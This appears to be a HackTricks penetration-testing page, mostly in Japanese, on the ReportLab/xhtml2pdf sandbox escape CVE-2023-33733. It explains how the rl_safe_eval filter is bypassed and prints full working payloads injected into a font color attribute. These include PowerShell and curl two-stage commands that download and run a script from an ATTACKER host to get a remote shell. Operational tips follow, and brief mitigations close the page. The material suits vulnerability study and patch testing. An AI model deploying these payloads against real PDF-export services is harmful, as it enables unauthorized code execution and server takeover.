# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

このページは、ReportLab の rl_safe_eval（xhtml2pdf や他の PDF 生成パイプラインで、ユーザー制御の HTML を PDF にレンダリングする際に使用される）における実用的なサンドボックス脱出と RCE プリミティブを記録します。

CVE-2023-33733 は ReportLab の 3.6.12 までのバージョンに影響します。特定の属性コンテキスト（例えば color）では、三重角括弧 [[[ ... ]]] で囲まれた値がサーバー側で rl_safe_eval によって評価されます。ホワイトリスト化された組み込み関数 (pow) からその関数の __globals__ にピボットするペイロードを作成することで、攻撃者は os モジュールに到達してコマンドを実行できます。

Key points
- トリガー: ReportLab/xhtml2pdf が解析するマークアップ内の <font color="..."> のような評価される属性に [[[ ... ]]] を注入する。
- サンドボックス: rl_safe_eval は危険な組み込みを置換するが、評価された関数は依然として __globals__ を公開する。
- バイパス: 一時的なクラス Word を作成して rl_safe_eval の名前チェックを回避し、ブロックされた dunder フィルタを避けつつ文字列 "__globals__" にアクセスする。
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- 安定性: 実行後に属性に有効な値を返す（color の場合は 'red' を使用）。

When to test
- HTML→PDF エクスポートを提供するアプリケーション（プロフィール、請求書、レポート）で、PDF メタデータや HTTP レスポンスのコメントに xhtml2pdf/ReportLab が表示される場合にテストする。
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" producer
- PDF に対する HTTP レスポンスはしばしば ReportLab の generator コメントで始まる。

How the sandbox bypass works
- rl_safe_eval は多くの組み込み（getattr, type, pow, ...）を削除または置換し、属性名が __ で始まるものや denylist にあるものを拒否する名前フィルタを適用する。
- しかし、安全な関数は func.__globals__ でアクセスできる globals 辞書内に存在する。
- type(type(1)) を使って実際の組み込み type 関数を復元（ReportLab のラッパーを回避）し、次のような比較挙動を変更した str 由来の Word クラスを定義する:
  - .startswith('__') → 常に False（startswith('__') チェックを回避）
  - .__eq__ は最初の比較時のみ False を返し（denylist のメンバーシップチェックを回避）、その後は True を返す（Python の getattr が動作するようにする）
  - .__hash__ は hash(str(self)) と等しい
- これにより getattr(pow, Word('__globals__')) はラップされた pow 関数の globals dict を返し、そこにインポートされた os モジュールが含まれている。その後: ['os'].system('<cmd>')。

Minimal exploitation pattern (attribute example)
ペイロードを評価される属性の内部に置き、boolean と 'red' を使って属性として有効な値を返すようにする。

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- リスト内包表現の形は、rl_safe_eval が受け入れる単一式を可能にする。
- 後続の and 'red' は有効な CSS カラーを返すので、レンダリングが壊れない。
- コマンドは必要に応じて置き換える。実行確認には tcpdump と ping を使う。

Operational workflow
1) Identify PDF generator
- PDF Producer が xhtml2pdf を示す; HTTP レスポンスに ReportLab コメントが含まれる場合がある。
2) Find an input reflected into the PDF (e.g., profile bio/description) and trigger an export.
- PDF に反映される入力を見つけ（例: プロフィールの bio/description）、エクスポートをトリガーする。
3) Verify execution with low-noise ICMP
- Run: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Windows はデフォルトで正確に 4 回の echo request を送ることが多い。
4) Establish a shell
- For Windows, a reliable two-stage approach avoids quoting/encoding issues:
- Stage 1 (download):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (execute):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Linux ターゲット向けには、curl/wget を使った同様の二段階が可能:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Notes and tips
- Attribute contexts: color は評価される属性として知られている。ReportLab のマークアップ内の他の属性も式を評価する可能性がある。ある場所がサニタイズされている場合は、PDF にレンダリングされる他の場所（別のフィールド、テーブルスタイル等）を試す。
- Quoting: コマンドはコンパクトに保つこと。二段階ダウンロードはクォートやエスケープの問題を大幅に減らす。
- Reliability: エクスポートがキャッシュまたはキュー処理される場合、ペイロードをわずかに変える（例: ランダムなパスやクエリ）ことでキャッシュヒットを避ける。

Mitigations and detection
- ReportLab を 3.6.13 以降にアップグレードする（CVE-2023-33733 は修正済み）。ディストロのパッケージに関するセキュリティアドバイザリも追跡すること。
- ユーザー制御の HTML/マークアップを xhtml2pdf/ReportLab に直接渡さないこと。厳格なサニタイズを行うか、信頼できない入力に対しては [[[...]]] 評価構文やベンダー固有タグを削除/拒否する。
- 信頼できない入力に対しては rl_safe_eval の使用を無効化するかラップすることを検討する。
- PDF 生成中の疑わしい外向きコネクション（例: エクスポート時のアプリサーバーからの ICMP/HTTP）を監視する。

References
- PoC and technical analysis: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (real-world exploitation, Windows two-stage payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD entry (affected versions): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (markup/page concepts): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
